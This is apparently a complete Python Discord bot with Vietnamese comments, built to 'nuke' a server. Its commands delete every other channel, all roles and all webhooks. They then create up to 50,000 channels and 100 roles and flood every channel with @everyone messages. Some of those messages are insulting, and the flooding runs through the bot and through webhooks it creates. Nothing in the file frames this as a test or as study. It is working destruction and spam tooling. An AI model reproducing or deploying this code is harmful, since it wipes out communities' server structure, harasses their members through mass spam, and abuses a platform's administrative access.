# bot.py - Nuke with guaranteed spam using bot + webhook fallback
import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import os
import random
import aiohttp
from flask import Flask, jsonify
import threading

app = Flask(__name__)

TOKEN = os.getenv('DISCORD_TOKEN', '')
PORT = int(os.getenv('PORT', 10000))

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='', intents=intents, help_command=None)

class NukeCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.rate_limit_delay = 0.3
        self.channel_count = 50000
        self.role_count = 100
        self.spam_per_channel = 10

    @app_commands.command(name='nuke', description='🔥 Nuke - giữ kênh hiện tại, tạo 50k kênh, spam @everyone')
    @app_commands.default_permissions(administrator=True)
    async def slash_nuke(self, interaction: discord.Interaction):
        await interaction.response.send_message('🔥 **NUKE STARTED** 🔥', ephemeral=False)
        guild = interaction.guild
        current_channel = interaction.channel

        # Xóa các kênh khác
        await interaction.channel.send('🗑️ Deleting other channels...')
        deleted = await self.delete_all_channels_except(guild, current_channel)
        await interaction.channel.send(f'✅ Deleted {deleted} channels')

        # Xóa role và webhook
        await interaction.channel.send('🗑️ Deleting roles and webhooks...')
        deleted_roles = await self.delete_all_roles(guild)
        deleted_webhooks = await self.delete_all_webhooks(guild)
        await interaction.channel.send(f'✅ Deleted {deleted_roles} roles, {deleted_webhooks} webhooks')

        # Tạo kênh mới
        await interaction.channel.send(f'📝 Creating {self.channel_count} new channels...')
        created = await self.create_spam_channels(guild)
        await interaction.channel.send(f'✅ Created {created} channels')

        # Tạo role spam
        await interaction.channel.send(f'👑 Creating {self.role_count} roles...')
        created_roles = await self.create_spam_roles(guild)
        await interaction.channel.send(f'✅ Created {created_roles} roles')

        # Chờ Discord sync cache (quan trọng để bot thấy kênh mới)
        await interaction.channel.send('⏳ Waiting for Discord to sync (15s)...')
        await asyncio.sleep(15)

        # Phase 1: Spam bằng bot (đảm bảo tin nhắn đến)
        await interaction.channel.send('💬 Phase 1: Spamming via bot...')
        spammed_bot = await self.spam_all_channels(guild)
        await interaction.channel.send(f'✅ Bot sent {spammed_bot} messages')

        # Phase 2: Spam bằng webhook (tăng tốc)
        await interaction.channel.send('💬 Phase 2: Spamming via webhooks...')
        spammed_webhook = await self.spam_via_webhooks(guild)
        await interaction.channel.send(f'✅ Webhooks sent {spammed_webhook} messages')

        total = spammed_bot + spammed_webhook
        embed = discord.Embed(
            title='✅ NUKE COMPLETE',
            color=discord.Color.red()
        )
        embed.add_field(name='📊 Channels', value=f'{created:,}', inline=True)
        embed.add_field(name='👑 Roles', value=f'{created_roles:,}', inline=True)
        embed.add_field(name='💬 Total Spam', value=f'{total:,}', inline=True)
        await interaction.channel.send(embed=embed)

    @app_commands.command(name='spam', description='💬 Spam @everyone vào tất cả kênh')
    @app_commands.default_permissions(administrator=True)
    async def slash_spam(self, interaction: discord.Interaction, count: int = 10):
        await interaction.response.send_message(f'💬 Spamming {count} messages per channel...')
        sent = await self.spam_all_channels(interaction.guild, count)
        await interaction.channel.send(f'✅ Sent {sent} messages')

    @app_commands.command(name='clear', description='🗑️ Xóa tất cả kênh, role, webhook (trừ kênh hiện tại)')
    @app_commands.default_permissions(administrator=True)
    async def slash_clear(self, interaction: discord.Interaction):
        await interaction.response.send_message('🗑️ Clearing...', ephemeral=False)
        guild = interaction.guild
        current_channel = interaction.channel
        d1 = await self.delete_all_channels_except(guild, current_channel)
        d2 = await self.delete_all_roles(guild)
        d3 = await self.delete_all_webhooks(guild)
        await interaction.channel.send(f'✅ Deleted {d1} channels, {d2} roles, {d3} webhooks')

    # ---------- XÓA (giữ kênh hiện tại) ----------
    async def delete_all_channels_except(self, guild, keep_channel):
        count = 0
        for channel in guild.channels:
            if channel.id == keep_channel.id:
                continue
            try:
                await channel.delete()
                count += 1
                await asyncio.sleep(0.2)
            except:
                pass
        return count

    async def delete_all_roles(self, guild):
        count = 0
        for role in guild.roles:
            if role.name != '@everyone':
                try:
                    await role.delete()
                    count += 1
                    await asyncio.sleep(0.2)
                except:
                    pass
        return count

    async def delete_all_webhooks(self, guild):
        count = 0
        webhooks = await guild.webhooks()
        for wh in webhooks:
            try:
                await wh.delete()
                count += 1
                await asyncio.sleep(0.2)
            except:
                pass
        return count

    # ---------- TẠO KÊNH + ROLE ----------
    async def create_spam_channels(self, guild, count=None):
        if count is None:
            count = self.channel_count
        created = 0
        for i in range(count):
            try:
                await guild.create_text_channel(f'nuke-{i}')
                created += 1
                if created % 100 == 0:
                    print(f'✅ Created {created}/{count} channels')
                await asyncio.sleep(0.3)
            except discord.errors.RateLimited as e:
                await asyncio.sleep(e.retry_after + 1)
            except:
                pass
        return created

    async def create_spam_roles(self, guild, count=None):
        if count is None:
            count = self.role_count
        created = 0
        for i in range(count):
            try:
                await guild.create_role(
                    name=f'NUKE-ROLE-{i}',
                    color=discord.Color(random.randint(0, 0xFFFFFF)),
                    hoist=True,
                    mentionable=True
                )
                created += 1
                await asyncio.sleep(0.3)
            except:
                pass
        return created

    # ---------- SPAM BẰNG BOT (ĐẢM BẢO) ----------
    async def spam_all_channels(self, guild, count=None):
        if count is None:
            count = self.spam_per_channel
        sent = 0
        messages = [
            '@everyone SERVER DA BI NUKE',
            '@everyone NUKE ME MAY NEK',
            '@everyone https://discord.gg/xnyxd6QEa',
            '@everyone SERVER NAY DA BI PHA HUY',
            '@everyone MAY CHET CHUA CON NGU',
            '@everyone TAM BIET SERVER NHE',
            '@everyone HAHA NUKE THANH CONG'
        ]
        # Lấy danh sách text channel (bao gồm kênh mới)
        channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
        print(f'📢 Found {len(channels)} text channels for bot spam')
        if not channels:
            return 0

        for channel in channels:
            try:
                # Kiểm tra quyền
                perms = channel.permissions_for(guild.me)
                if not perms.send_messages:
                    print(f'❌ No permission in #{channel.name}')
                    continue
                # Gửi tin
                for _ in range(count):
                    await channel.send(random.choice(messages))
                    sent += 1
                    await asyncio.sleep(0.2)  # Giảm delay để nhanh hơn
            except discord.errors.RateLimited as e:
                await asyncio.sleep(e.retry_after + 1)
            except Exception as e:
                print(f'⚠️ Error in #{channel.name}: {e}')
        return sent

    # ---------- SPAM BẰNG WEBHOOK (TĂNG TỐC) ----------
    async def spam_via_webhooks(self, guild):
        messages = [
            '@everyone SERVER DA BI NUKE',
            '@everyone NUKE ME MAY NEK',
            '@everyone https://discord.gg/xnyxd6QEa',
            '@everyone SERVER NAY DA BI PHA HUY',
            '@everyone MAY CHET CHUA CON NGU',
            '@everyone TAM BIET SERVER NHE',
            '@everyone HAHA NUKE THANH CONG'
        ]
        text_channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
        print(f'📢 Found {len(text_channels)} text channels for webhook spam')
        if not text_channels:
            return 0

        sent = 0
        async with aiohttp.ClientSession() as session:
            # Tạo webhook cho 100 kênh đầu tiên (để tránh rate limit tạo webhook)
            webhooks = []
            for channel in text_channels[:100]:
                try:
                    webhook = await channel.create_webhook(name='SPAMMER')
                    webhooks.append(webhook)
                    await asyncio.sleep(0.2)
                except:
                    pass

            if not webhooks:
                print('⚠️ No webhooks created!')
                return 0

            print(f'✅ Created {len(webhooks)} webhooks')

            # Spam song song
            tasks = []
            for webhook in webhooks:
                for _ in range(self.spam_per_channel):
                    msg = random.choice(messages)
                    url = f'https://discord.com/api/webhooks/{webhook.id}/{webhook.token}'
                    tasks.append(session.post(url, json={'content': msg}))
                    sent += 1
                    if len(tasks) >= 30:
                        await asyncio.gather(*tasks)
                        tasks = []
                        await asyncio.sleep(0.05)  # Rất nhanh

            if tasks:
                await asyncio.gather(*tasks)

        return sent

# ---------- SỰ KIỆN ----------
@bot.event
async def on_ready():
    print(f'✅ Bot: {bot.user}')
    print(f'📡 Servers: {len(bot.guilds)}')
    try:
        synced = await bot.tree.sync()
        print(f'✅ Synced: {[c.name for c in synced]}')
    except Exception as e:
        print(f'❌ Sync error: {e}')

# ---------- FLASK ----------
@app.route('/')
def index():
    return jsonify({'status': 'online', 'bot': str(bot.user)})

@app.route('/ping')
def ping():
    return jsonify({'pong': True})

@app.route('/health')
def health():
    return jsonify({'status': 'healthy'})

# ---------- CHẠY ----------
async def run_bot():
    await bot.add_cog(NukeCommands(bot))
    await bot.start(TOKEN)

def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False)

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    try:
        asyncio.run(run_bot())
    except:
        pass
